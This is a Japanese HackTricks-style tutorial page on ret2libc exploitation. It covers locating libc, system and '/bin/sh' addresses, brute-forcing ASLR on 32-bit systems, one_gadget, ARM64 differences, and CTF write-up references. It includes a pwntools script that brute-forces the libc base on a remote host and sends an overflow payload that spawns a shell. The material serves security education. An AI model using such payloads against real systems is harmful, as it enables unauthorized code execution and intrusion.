# Ret2lib

{{#include ../../../banners/hacktricks-training.md}}

## **基本情報**

**Ret2Libc**の本質は、脆弱なプログラムの実行フローを攻撃者が提供したシェルコードをスタック上で実行するのではなく、共有ライブラリ内の関数（例：**system**、**execve**、**strcpy**）にリダイレクトすることです。攻撃者は、スタック上の戻りアドレスを目的のライブラリ関数を指すように変更するペイロードを作成し、呼び出し規約に従って必要な引数が正しく設定されるようにします。

### **例の手順（簡略化）**

- 呼び出す関数のアドレス（例：system）と呼び出すコマンド（例：/bin/sh）を取得する
- コマンド文字列を指す最初の引数と関数への実行フローを渡すROPチェーンを生成する

## アドレスの特定

- 使用する`libc`が現在のマシンのものであると仮定すると、メモリにロードされる場所を次のコマンドで見つけることができます：
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
ASLRがlibcのアドレスを変更しているかどうかを確認したい場合は、次のようにします:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
- 使用されているlibcを知っていれば、`system`関数へのオフセットを見つけることも可能です。
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
- 使用されているlibcを知っていれば、次のようにして`/bin/sh`関数へのオフセットを見つけることも可能です:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### gdb-peda / GEFの使用

使用されているlibcを知っていると、PedaやGEFを使って**system**関数、**exit**関数、そして文字列**`/bin/sh`**のアドレスを取得することも可能です：
```bash
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/mapsの使用

プロセスがあなたと話すたびに**子プロセス**を作成している場合（ネットワークサーバー）、そのファイルを**読み取る**ことを試みてください（おそらくroot権限が必要です）。

ここでは、プロセス内で**libcがどこにロードされているか**、およびプロセスのすべての子プロセスに対して**どこにロードされるか**を正確に見つけることができます。

![](<../../../images/image (853).png>)

この場合、**0xb75dc000**にロードされています（これがlibcのベースアドレスになります）。

## 不明なlibc

バイナリがロードしている**libcを知らない**可能性があります（アクセスできないサーバーにあるかもしれません）。その場合、脆弱性を悪用して**いくつかのアドレスをリークし、どのlibc**ライブラリが使用されているかを見つけることができます：

{{#ref}}
rop-leaking-libc-address/
{{#endref}}

これに関するpwntoolsテンプレートは次の場所にあります：

{{#ref}}
rop-leaking-libc-address/rop-leaking-libc-template.md
{{#endref}}

### 2つのオフセットでlibcを知る

ページ[https://libc.blukat.me/](https://libc.blukat.me/)を確認し、libc内の関数の**いくつかのアドレス**を使用して**使用されているバージョン**を特定します。

## 32ビットでのASLRのバイパス

これらのブルートフォース攻撃は**32ビットシステムにのみ有効**です。

- エクスプロイトがローカルの場合、libcのベースアドレスをブルートフォースすることを試みることができます（32ビットシステムに有用）：
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
- リモートサーバーを攻撃する場合、**`libc`関数`usleep`のアドレスをブルートフォースする**ことを試みることができます。引数として10を渡します（例えば）。もしある時点で**サーバーが応答するのに10秒余分にかかる**場合、この関数のアドレスを見つけたことになります。

## One Gadget

libcの**特定の**アドレスにジャンプしてシェルを実行します：

{{#ref}}
one-gadget.md
{{#endref}}

## x86 Ret2lib コード例

この例では、ASLRブルートフォースがコードに統合されており、脆弱なバイナリはリモートサーバーにあります：
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib コード例

次の例を確認してください:

{{#ref}}
../
{{#endref}}

## ARM64 Ret2lib 例

ARM64の場合、ret命令はx30レジスタが指している場所にジャンプし、スタックレジスタが指している場所にはジャンプしません。したがって、少し複雑です。

また、ARM64では命令はその命令が行うことを行います（命令の途中でジャンプして新しい命令に変換することはできません）。

次の例を確認してください:

{{#ref}}
ret2lib-+-printf-leak-arm64.md
{{#endref}}

## Ret-into-printf (または puts)

これは、特定のデータを引数として指定して`printf`/`puts`を呼び出すことで**プロセスから情報を漏洩させる**ことを可能にします。例えば、`puts`のアドレスをGOTに入れて`puts`を実行すると、**メモリ内の`puts`のアドレスが漏洩します**。

## Ret2printf

これは基本的に、**Ret2libを悪用して`printf`フォーマット文字列の脆弱性に変換する**ことを意味します。`ret2lib`を使用してprintfを呼び出し、悪用する値を渡します（無駄に聞こえますが可能です）:

{{#ref}}
../../format-strings/
{{#endref}}

## その他の例と参考文献

- [https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html)
- Ret2lib、libc内の関数のアドレスへの漏洩を利用し、one gadgetを使用
- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64ビット、ASLR有効だがPIEなし、最初のステップはオーバーフローを埋めてカナリアのバイト0x00まで到達し、次にputsを呼び出して漏洩させることです。カナリアを使ってROPガジェットを作成し、putsを呼び出してGOTからputsのアドレスを漏洩させ、次に`system('/bin/sh')`を呼び出すROPガジェットを作成します。
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64ビット、ASLR有効、カナリアなし、子関数からのメインでのスタックオーバーフロー。GOTからputsのアドレスを漏洩させるためにputsを呼び出すROPガジェットを作成し、その後one gadgetを呼び出します。
- [https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html)
- 64ビット、PIEなし、カナリアなし、relroなし、nx。write関数を使用してwrite（libc）のアドレスを漏洩させ、one gadgetを呼び出します。
- [https://guyinatuxedo.github.io/14-ret_2_system/asis17_marymorton/index.html](https://guyinatuxedo.github.io/14-ret_2_system/asis17_marymorton/index.html)
- フォーマット文字列を使用してスタックからカナリアを漏洩させ、バッファオーバーフローを使用してsystem（GOT内）を呼び出し、`/bin/sh`のアドレスを渡します。
- [https://guyinatuxedo.github.io/14-ret_2_system/tu_guestbook/index.html](https://guyinatuxedo.github.io/14-ret_2_system/tu_guestbook/index.html)
- 32ビット、relroなし、カナリアなし、nx、pie。悪いインデックスを悪用してスタックからlibcとヒープのアドレスを漏洩させます。バッファオーバーフローを悪用して`system('/bin/sh')`を呼び出すret2libを行います（ヒープアドレスはチェックをバイパスするために必要です）。

{{#include ../../../banners/hacktricks-training.md}}
